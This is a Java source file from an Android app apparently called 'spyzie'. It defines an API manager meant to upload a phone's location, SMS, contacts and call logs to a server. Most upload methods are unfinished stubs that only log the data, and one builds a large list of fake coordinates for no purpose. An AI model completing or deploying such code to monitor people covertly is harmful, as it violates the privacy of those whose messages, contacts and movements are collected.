package com.tantd.spyzie.data.network;

import android.util.Log;

import com.rx2androidnetworking.Rx2AndroidNetworking;
import com.tantd.spyzie.data.model.Call;
import com.tantd.spyzie.data.model.Contact;
import com.tantd.spyzie.data.model.Error;
import com.tantd.spyzie.data.model.Event;
import com.tantd.spyzie.data.model.Location;
import com.tantd.spyzie.data.model.Sms;
import com.tantd.spyzie.util.Constants;

import java.util.ArrayList;
import java.util.List;

import io.reactivex.Single;

/**
 * Created by tantd on 8/21/2017.
 */
public class AppApiManager implements ApiManager {

    private static final String DEBUG_SUB_TAG = "[" + AppApiManager.class.getSimpleName() + "] ";

    private static AppApiManager instance;

    public static synchronized AppApiManager getInstance() {
        if (instance == null) {
            instance = new AppApiManager();
        }
        return instance;
    }

    private AppApiManager() {
    }

    @Override
    public Single<List<Event>> getSchedules() {
        return Rx2AndroidNetworking.get(ApiEndPoint.ENDPOINT_SCHEDULES)
                .build().getObjectListSingle(Event.class);
    }

    @Override
    public void sendLocationData(Location location) {
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendLocationData, lat=" + location.lat + ", lon=" + location.lon);
        // TODO: Use Rx2AndroidNetworking to post location data to server

        int COUNT = 500000;
        List<Location> locations = new ArrayList<>();
        for (int i = 0; i < COUNT; i++) {
            locations.add(new Location(21.0166988, 105.7817053));
        }

    }

    @Override
    public void sendSmsData(Sms sms) {
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendSmsData: " + sms.toString());
        // TODO: implement here
    }

    @Override
    public void sendExceptionTracking(Error error) {
        // TODO: implement here
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendExceptionTracking, error=" + error + ", errorValue=" + error.ordinal());
    }

    @Override
    public void sendContactsData(List<Contact> contacts) {
        // TODO: implement here
        printContacts(contacts);
    }

    @Override
    public void sendCallsData(List<Call> calls) {
        // TODO: implement here
        print(calls);
    }

    private <T> void print(List<T> objects) {
        for (T t :
                objects) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + t);
        }
    }

    private void printContacts(List<Contact> contacts) {
        for (Contact contact :
                contacts) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + contact);
        }
    }
}
